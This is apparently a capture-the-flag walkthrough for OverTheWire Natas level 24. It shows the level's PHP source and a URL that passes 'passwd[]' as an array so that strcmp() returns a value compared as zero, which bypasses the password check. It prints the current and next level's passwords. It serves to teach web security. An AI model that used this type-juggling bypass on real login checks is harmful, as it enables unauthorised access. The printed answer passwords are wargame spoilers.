# Natas Level 24 → Level 25
(Updated: 16 August 2025)

## Credentials
- **Username:** `natas24`
- **Password:** `MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd`

## Connection
Level url: [http://natas24.natas.labs.overthewire.org/](http://natas24.natas.labs.overthewire.org/)

## Steps to Solve
1. Step 1 - Click `View sourcecode` in order to see the source:
```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```
**`strcmp()` has really strange behavior, our target will need it to return `0`**

2. Step 2 - You can access to the `natas24` web by `passwd[]` => `http://natas24.natas.labs.overthewire.org/?passwd%5b%5d` to get the password.
3. Step 3 - Take the password to the next level.

## Next Level Password
`ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`